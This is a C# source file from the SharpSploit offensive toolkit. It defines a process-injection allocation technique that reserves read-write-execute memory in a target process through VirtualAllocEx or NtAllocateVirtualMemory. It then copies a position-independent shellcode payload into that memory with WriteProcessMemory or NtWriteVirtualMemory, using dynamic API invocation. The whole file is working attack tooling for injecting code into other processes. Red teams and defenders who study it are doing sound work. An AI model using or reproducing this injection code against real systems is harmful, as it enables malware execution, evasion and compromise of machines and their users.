using System;
using System.Linq;
using System.Diagnostics;
using System.Runtime.InteropServices;

using SharpSploit.Execution.DynamicInvoke;

namespace SharpSploit.Execution.Injection
{
    /// <summary>
    /// Allocates a payload to a target process using VirtualAllocateEx and WriteProcessMemory
    /// </summary>
    /// <author>aus</author>
    public class VirtualAllocAllocationTechnique : AllocationTechnique
    {
        private readonly Win32.Kernel32.AllocationType AllocationType = Win32.Kernel32.AllocationType.Reserve | Win32.Kernel32.AllocationType.Commit;
        private readonly Win32.Kernel32.MemoryProtection MemoryProtection = Win32.Kernel32.MemoryProtection.ExecuteReadWrite;
        private readonly AllocationAPI AllocAPI = AllocationAPI.VirtualAllocEx;
        private readonly WriteAPI Write_API = WriteAPI.WriteProcessMemory;

        public enum AllocationAPI
        {
            VirtualAllocEx,
            NtAllocateVirtualMemory
        };

        public enum WriteAPI
        {
            WriteProcessMemory,
            NtWriteVirtualMemory
        };

        /// <summary>
        /// Default constructor.
        /// </summary>
        public VirtualAllocAllocationTechnique()
        {
            DefineSupportedPayloadTypes();
        }

        /// <summary>
        /// Constructor allowing options as arguments.
        /// </summary>
        public VirtualAllocAllocationTechnique(
            Win32.Kernel32.AllocationType AllocationType = Win32.Kernel32.AllocationType.Reserve | Win32.Kernel32.AllocationType.Commit,
            Win32.Kernel32.MemoryProtection MemoryProtection = Win32.Kernel32.MemoryProtection.ExecuteReadWrite,
            AllocationAPI alloc = AllocationAPI.VirtualAllocEx,
            WriteAPI write = WriteAPI.WriteProcessMemory
        )
        {
            DefineSupportedPayloadTypes();
            this.AllocationType = AllocationType;
            this.MemoryProtection = MemoryProtection;
            this.AllocAPI = alloc;
            this.Write_API = write;
        }

        /// <summary>
        /// States whether the payload is supported.
        /// </summary>
        /// <author>The Wover (@TheRealWover)</author>
        /// <param name="Payload">Payload that will be allocated.</param>
        /// <returns></returns>
        public override bool IsSupportedPayloadType(PayloadType Payload)
        {
            return supportedPayloads.Contains(Payload.GetType());
        }

        /// <summary>
        /// Internal method for setting the supported payload types. Used in constructors.
        /// Update when new types of payloads are added.
        /// </summary>
        /// <author>The Wover (@TheRealWover)</author>
        internal override void DefineSupportedPayloadTypes()
        {
            //Defines the set of supported payload types.
            supportedPayloads = new Type[] {
                typeof(PICPayload)
            };
        }

        /// <summary>
        /// Allocate the payload to the target process. Handles unknown payload types.
        /// </summary>
        /// <author>The Wover (@TheRealWover)</author>
        /// <param name="Payload">The payload to allocate to the target process.</param>
        /// <param name="Process">The target process.</param>
        /// <returns>Base address of allocated memory within the target process's virtual memory space.</returns>
        public override IntPtr Allocate(PayloadType Payload, Process Process)
        {
            if (!IsSupportedPayloadType(Payload))
            {
                throw new PayloadTypeNotSupported(Payload.GetType());
            }
            return Allocate(Payload, Process, IntPtr.Zero);
        }

        /// <summary>
        /// Allocate the payload in the target process via VirtualAllocEx + WriteProcessMemory
        /// </summary>
        /// <author>The Wover (@TheRealWover), aus (@aus)</author>
        /// <param name="Payload">The PIC payload to allocate to the target process.</param>
        /// <param name="Process">The target process.</param>
        /// <param name="PreferredAddress">The preferred address at which to allocate the payload in the target process.</param>
        /// <returns>Base address of allocated memory within the target process's virtual memory space.</returns>
        public IntPtr Allocate(PICPayload Payload, Process Process, IntPtr PreferredAddress = new IntPtr())
        {
            // Get a convenient handle for the target process.
            IntPtr procHandle = Process.Handle;
            // Allocate some memory
            IntPtr regionAddress = PreferredAddress;

            if (this.AllocAPI == AllocationAPI.VirtualAllocEx)
            {
                regionAddress = DynamicInvoke.Win32.VirtualAllocEx(procHandle, PreferredAddress, (uint)Payload.Payload.Length, AllocationType, MemoryProtection);
                if (regionAddress == IntPtr.Zero)
                {
                    throw new AllocationFailed(Marshal.GetLastWin32Error());
                }
            }
            else if (this.AllocAPI == AllocationAPI.NtAllocateVirtualMemory)
            {
                IntPtr regionSize = new IntPtr(Payload.Payload.Length);
                DynamicInvoke.Native.NtAllocateVirtualMemory(procHandle, ref regionAddress, IntPtr.Zero, ref regionSize, AllocationType, (uint)MemoryProtection);
            }

            if (this.Write_API == WriteAPI.WriteProcessMemory)
            {
                // Copy the shellcode to allocated memory
                bool retVal = DynamicInvoke.Win32.WriteProcessMemory(procHandle, regionAddress, Payload.Payload, (Int32)Payload.Payload.Length, out _);
                if (!retVal)
                {
                    throw new MemoryWriteFailed(Marshal.GetLastWin32Error());
                }
            }
            else if (this.Write_API == WriteAPI.NtWriteVirtualMemory)
            {
                GCHandle handle = GCHandle.Alloc(Payload.Payload, GCHandleType.Pinned);
                IntPtr payloadPtr = handle.AddrOfPinnedObject();
                uint BytesWritten = DynamicInvoke.Native.NtWriteVirtualMemory(procHandle, regionAddress, payloadPtr, (uint)Payload.Payload.Length);
                if (BytesWritten != (uint)Payload.Payload.Length)
                {
                    throw new MemoryWriteFailed(0);
                }
            }

            return regionAddress;
        }
    }
}
